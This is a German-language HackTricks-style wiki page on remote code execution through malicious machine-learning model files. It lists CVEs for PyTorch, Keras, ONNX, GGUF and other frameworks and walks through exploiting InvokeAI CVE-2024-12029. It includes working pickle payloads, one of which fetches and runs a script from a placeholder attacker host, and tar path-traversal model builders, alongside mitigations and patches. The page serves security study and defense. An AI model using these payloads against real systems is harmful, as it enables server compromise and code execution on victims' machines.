# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden für RCE

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten geteilt, wie ONNX, TensorFlow, PyTorch, etc. Diese Modelle können auf Entwicklerrechnern oder Produktionssystemen geladen werden, um sie zu verwenden. Normalerweise sollten die Modelle keinen bösartigen Code enthalten, aber es gibt Fälle, in denen das Modell dazu verwendet werden kann, beliebigen Code auf dem System auszuführen — entweder als beabsichtigte Funktion oder wegen einer Schwachstelle in der Model-Ladebibliothek.

Zum Zeitpunkt der Abfassung sind dies einige Beispiele für diese Art von Schwachstellen:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartige pickle im Model-Checkpoint führt zu Codeausführung (Umgehung der `weights_only`-Absicherung)                                    | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + bösartiger Model-Download verursacht Codeausführung; Java-Deserialisierungs-RCE in Management-API                                 | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint löst pickle-Reducer beim `load_model_trainer_states_from_checkpoint` aus → Codeausführung im ML-Worker                 | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Laden eines Modells mit **Lambda**-Layer führt beliebigen Python-Code aus | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Manipuliertes `.tflite`-Modell löst Integer-Overflow aus → Heap-Korruption (potenzielles RCE)                                            | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laden eines Modells via `joblib.load` führt pickle mit dem `__reduce__`-Payload des Angreifers aus                                        | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` erlaubte standardmäßig gepicklete Objekt-Arrays – bösartige `.npy/.npz` löst Codeausführung aus                              | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Externe-weights-Pfad eines ONNX-Modells kann das Verzeichnis verlassen (Beliebige Dateien lesen) <br> Bösartiges ONNX-Modell-Tar kann beliebige Dateien überschreiben (führt potentiell zu RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modell mit custom operator erfordert das Laden nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik für unerwünschte Berechnungen | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Verwendung der Model-Load-API mit aktivierter `--model-control` erlaubt relative Pfad-Traversal zum Schreiben von Dateien (z. B. Überschreiben von `.bashrc` für RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Fehlerhaftes GGUF-Modell verursacht Heap-Buffer-Overflows im Parser, was die Ausführung beliebigen Codes auf dem Zielsystem ermöglicht     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Bösartige HDF5 (`.h5`) Modell mit Lambda-Layer-Code wird beim Laden weiterhin ausgeführt (Keras `safe_mode` deckt altes Format nicht ab – „downgrade attack“) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Viele ML-Tools (z. B. pickle-basierte Modellformate, Python `pickle.load`) führen beliebigen Code aus, der in Modell-Dateien eingebettet ist, sofern nicht gemindert | |

Außerdem gibt es einige Python-pickle-basierte Modelle, wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die dazu verwendet werden können, beliebigen Code auf dem System auszuführen, wenn sie nicht mit `weights_only=True` geladen werden. Daher können beliebige pickle-basierte Modelle besonders anfällig für diese Art von Angriffen sein, selbst wenn sie nicht in der obigen Tabelle aufgeführt sind.

### 🆕  InvokeAI RCE über `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, der es Benutzern ermöglicht, Modelle von beliebigen URLs herunterzuladen und zu laden.

Intern ruft der Endpunkt schließlich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die gelieferte Datei ein **PyTorch checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **pickle deserialization** durch. Da der Inhalt direkt von einer vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den Checkpoint einbetten; die Methode wird **during deserialization** ausgeführt, was zu **remote code execution (RCE)** auf dem InvokeAI-Server führt.

Die Schwachstelle wurde als **CVE-2024-12029** eingestuft (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Erstelle einen bösartigen Checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Stellen Sie `payload.ckpt` auf einem von Ihnen kontrollierten HTTP-Server bereit (z. B. `http://ATTACKER/payload.ckpt`).
3. Rufen Sie den vulnerable endpoint auf (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erlangt Codeausführung im Kontext des InvokeAI-Prozesses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag standardmäßig **false**)  
•  `/api/v2/models/install` für den Angreifer erreichbar  
•  Prozess hat Berechtigungen, Shell-Befehle auszuführen

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – der Patch setzt `scan=True` standardmäßig und führt Malware-Scans vor der Deserialisierung durch.  
* Beim programmatischen Laden von Checkpoints `torch.load(file, weights_only=True)` verwenden oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Erzwinge allow-lists / signatures für model sources und betreibe den Service mit least-privilege.

> ⚠️ Denk daran, dass **jedes** auf Python-pickle basierende Format (einschließlich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) inhärent unsicher ist, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Maßnahme, wenn Sie ältere InvokeAI-Versionen hinter einem reverse proxy weiter betreiben müssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE über unsichere `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (Teil von Merlin) enthielt einen unsicheren Checkpoint-Loader, der direkt `torch.load()` auf benutzerbereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein von einem Angreifer kontrollierter Checkpoint während der Deserialisierung über einen Reducer beliebigen Code ausführen.

Anfälliger Pfad (vor Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum das zu RCE führt: Im Python `pickle` kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der eine aufrufbare Funktion und Argumente zurückgibt. Die aufrufbare Funktion wird während des Unpicklings ausgeführt. Wenn ein solches Objekt in einem Checkpoint vorhanden ist, läuft es, bevor irgendwelche Weights verwendet werden.

Minimales bösartiges Checkpoint-Beispiel:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Verbreitungsvektoren und Blast-Radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Die Ausführung erfolgt innerhalb von training/inference-Workern, oft mit erhöhten Rechten (z. B. root in Containern)

Behebung: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte das direkte `torch.load()` durch einen eingeschränkten, zugelassenen Deserializer, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass während des Ladens beliebige Callables ausgeführt werden.

Empfehlungen speziell für PyTorch-Checkpoints:
- Unpicklen Sie keine nicht vertrauenswürdigen Daten. Bevorzugen Sie nicht-ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX, wenn möglich.
- Wenn Sie PyTorch-Serialization verwenden müssen, stellen Sie sicher, dass `weights_only=True` (in neueren PyTorch-Versionen unterstützt) oder verwenden Sie einen benutzerdefinierten, zugelassenen Unpickler ähnlich dem Transformers4Rec-Patch.
- Setzen Sie Model-Provenienz/Signaturen durch und sandboxt die Deserialisierung (seccomp/AppArmor; Nicht-Root-Benutzer; eingeschränktes Dateisystem und kein ausgehender Netzwerkverkehr).
- Überwachen Sie unerwartete Child-Prozesse von ML-Services zur Checkpoint-Ladezeit; verfolgen Sie die Nutzung von `torch.load()`/`pickle`.

POC- und verwundbare/patch-Referenzen:
- Verwundbarer Pre-Patch-Loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Bösartiger Checkpoint-POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-Patch-Loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Beispiel – Erstellung eines bösartigen PyTorch-Modells

- Erstelle das Modell:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelle für Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

Zum Beispiel können Sie mit folgendem Code ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder können Sie mit dem folgenden Code ein Modell erstellen, das beim Laden einen symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Tiefenanalyse: Keras .keras deserialization and gadget hunting

Für einen fokussierten Leitfaden zu den Interna von .keras, Lambda-layer RCE, dem arbitrary import issue in ≤ 3.8 und der post-fix gadget discovery innerhalb der allowlist, siehe:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
